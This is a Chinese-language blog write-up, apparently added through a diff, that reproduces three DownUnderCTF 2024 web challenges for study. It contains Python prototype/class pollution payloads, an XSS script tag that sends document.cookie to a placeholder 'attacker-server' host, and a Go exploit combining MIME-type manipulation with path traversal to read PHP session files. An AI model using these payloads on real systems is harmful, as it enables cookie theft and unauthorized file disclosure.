@@ -1,0 +1,222 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>DownUnderCTF赛题复现 · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2024-10-25">2024年10月25日</time>
+        
+        
+          <span class="post__readtime">8 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/CTF/">#CTF</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">DownUnderCTF赛题复现</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <p><a target="_blank" rel="noopener" href="https://github.com/DownUnderCTF/Challenges_2024_Public">题目连接</a></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="co2"><a href="#co2" class="headerlink" title="co2"></a>co2</h2><p>挺简单的原型链污染</p>
+<p><code>route.py</code>文件中设置flag的值</p>
+<p><img src="/../img/Typora/image-20241025175436194.png" alt="image-20241025175436194"></p>
+<p>在<code>/get_flag</code>路由汇总如果<code>flag == &quot;true&quot;</code>则返回flag</p>
+<p><img src="/../img/Typora/image-20241025175514206.png" alt="image-20241025175514206"></p>
+<p>在<code>/save_feedback</code>路由汇总调用了<code>merge</code>函数</p>
+<p><img src="/../img/Typora/image-20241025175936597.png" alt="image-20241025175936597"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以通过<code>sava_feedback</code>路由来对flag进行污染</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;flag&quot;:&quot;true&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20241025180408995.png" alt="image-20241025180408995"></p>
+<h2 id="co2v2"><a href="#co2v2" class="headerlink" title="co2v2"></a>co2v2</h2><p><code>/save_feedback</code>路由中存在<code>merge</code>函数，且参数可控。存在原型链污染</p>
+<p><img src="/../img/Typora/image-20241026175515809.png" alt="image-20241026175515809"></p>
+<p><code>/admin/update-accepted-templates</code>路由，如果json中存在policy且policy的值为strict会更新环境</p>
+<p><img src="/../img/Typora/image-20241026175506349.png" alt="image-20241026175506349"></p>
+<p>开启了CSP策略在每次请求时会设置一个<code>nonce</code>如果<code>javascript</code>代码的<code>nonce</code>与后端的相同就会执行相应的js代码</p>
+<p><img src="/../img/Typora/image-20241026180249129.png" alt="image-20241026180249129"></p>
+<p><code>generate_nonce()</code>函数中设置<code>nonce</code>其中<code>SECRET_NONCE</code>与<code>RANDOM_COUNT</code>值可以被污染</p>
+<p><img src="/../img/Typora/image-20241026180452784.png" alt="image-20241026180452784"></p>
+<p><code>TEMPLATES_ESCAPE_ALL</code>的值也可以被污染成false。来关闭转义xss</p>
+<p><img src="/../img/Typora/image-20241026180507876.png" alt="image-20241026180507876"></p>
+<p>先污染<code>TEMPLATES_ESCAPE_ALL</code> <code>SECRET_NONCE``RANDOM_COUNT</code>的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;TEMPLATES_ESCAPE_ALL&quot;:false&#125;&#125;&#125;</span><br><span class="line">&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;SECRET_NONCE&quot;:&quot;t&quot;&#125;&#125;&#125;</span><br><span class="line">&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;RANDOM_COUNT&quot;:0&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再向<code>/admin/update-accepted-templates</code>发送<code>&#123;&quot;policy&quot;:&quot;strict&quot;&#125;</code>来更新模块</p>
+<p>最后再添加帖子时候将js的<code>nonce</code>属性设置成<code>a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32</code>就能触发js语句</p>
+<p>用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=&quot;a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32&quot;&gt;fetch(&quot;http://attacker-server/xss?cookie=&quot;+document.cookie);&lt;/script&gt;</span><br><span class="line">进行cookie外带</span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么。我复现时搭建的环境一直打不到flag</p>
+<h2 id="sniffy"><a href="#sniffy" class="headerlink" title="sniffy"></a>sniffy</h2><p>题目中给了源码</p>
+<p>在<code>index.php</code>中将<code>flag</code>的值赋给了<code>session[&#39;flag&#39;]</code></p>
+<p><img src="/../img/Typora/image-20241027183609762.png" alt="image-20241027183609762"><code>session[&#39;theme&#39;]</code>接收GET传入的<code>theme</code>参数。。。<code>??</code>是PHP中的空合并运算符它的作用是检查左侧的值是否存在且不为null。如果存在，则返回左侧的值；如果不存在，则返回右侧的值。</p>
+<p><img src="/../img/Typora/image-20241027184037665.png" alt="image-20241027184037665"></p>
+<p>如果<code>theme</code>以GET的方式传入了值。则<code>$_SESSION[&#39;theme&#39;]</code>将使用传入的值</p>
+<p>在<code>audio.php</code>中存在文件读取。但是会判断文件的<code>mine</code>类型是否为<code>audio</code></p>
+<p><img src="/../img/Typora/image-20241027184324330.png" alt="image-20241027184324330"></p>
+<p><code>mime_content_type</code>函数以<code>magic.mime</code>文件中的信息来确定<code>mime</code></p>
+<p><img src="/../img/Typora/image-20241027184346280.png" alt="image-20241027184346280"></p>
+<p>我们传入的<code>theme</code>值将会在<code>/tmp/sess_xxx</code>文件的中间出现。我们可传入便宜量较大的字符串来更改文件的<code>mime</code></p>
+<p>例如:<code>M.K.</code>、 <code>M!K!</code>、<code>FLT4</code>、<code>FLT8</code>这些便宜量较大的值(1080)</p>
+<p>同时不知道flag占据了多少了个字节。可以进行4个循环在每个循环中添加一个字符来进行破解</p>
+<p>exp</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;net/url&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	target := <span class="string">&quot;http://192.168.22.129:1880&quot;</span></span><br><span class="line">	target2 := <span class="string">&quot;http://192.168.22.129:1880/audio.php&quot;</span></span><br><span class="line">	<span class="comment">//target := &quot;https://httpbin.org/get&quot;</span></span><br><span class="line">	Client := http.Client&#123;&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ &#123;</span><br><span class="line">		req1, err := http.NewRequest(<span class="string">&quot;GET&quot;</span>, target, <span class="literal">nil</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">		&#125;</span><br><span class="line">		param := <span class="built_in">make</span>(url.Values)</span><br><span class="line">		param.Add(<span class="string">&quot;theme&quot;</span>, strings.Repeat(<span class="string">&quot;s&quot;</span>, i)+strings.Repeat(<span class="string">&quot;4CHN&quot;</span>, <span class="number">270</span>))</span><br><span class="line">		req1.URL.RawQuery = param.Encode()</span><br><span class="line">		req1.Header.Add(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;PHPSESSID=yex&quot;</span>)</span><br><span class="line">		do, err := Client.Do(req1)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">defer</span> do.Body.Close()</span><br><span class="line">		_, err = ioutil.ReadAll(do.Body)</span><br><span class="line"></span><br><span class="line">		req2, err := http.NewRequest(<span class="string">&quot;GET&quot;</span>, target2, <span class="literal">nil</span>)</span><br><span class="line">		param2 := <span class="built_in">make</span>(url.Values)</span><br><span class="line">		param2.Add(<span class="string">&quot;f&quot;</span>, <span class="string">&quot;../../../../../../../tmp/sess_yex&quot;</span>)</span><br><span class="line">		req2.URL.RawQuery = param2.Encode()</span><br><span class="line">		do2, _ := Client.Do(req2)</span><br><span class="line">		<span class="keyword">defer</span> do2.Body.Close()</span><br><span class="line">		data2, _ := io.ReadAll(do2.Body)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> do2.StatusCode != <span class="number">403</span> &#123;</span><br><span class="line"></span><br><span class="line">			fmt.Println(<span class="type">string</span>(data2))</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2026-03-26">2026·03·26</time>
+          <a class="related__link" href="/2026/03/26/CTF/%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9B_easy_time/">第十九届全国大学生信息安全竞赛暨第三届“长城杯”铁人三项赛半决赛_easy_time</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-12-15">2024·12·15</time>
+          <a class="related__link" href="/2024/12/15/CTF/2024.12.15CISCN&%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B/">	</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2024-11-01">2024·11·01</time>
+          <a class="related__link" href="/2024/11/01/CTF/ImaginaryCTF%202024/">ImaginaryCTF 2024</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2024/10/27/%E9%9D%B6%E6%9C%BA/hackmyvm/Hacker_Kid-v1.0.1/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">Hacker_Kid-v1.0.1</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2024/10/10/%E9%9D%B6%E6%9C%BA/lazySysAdmin/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">lazySysAdmin</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
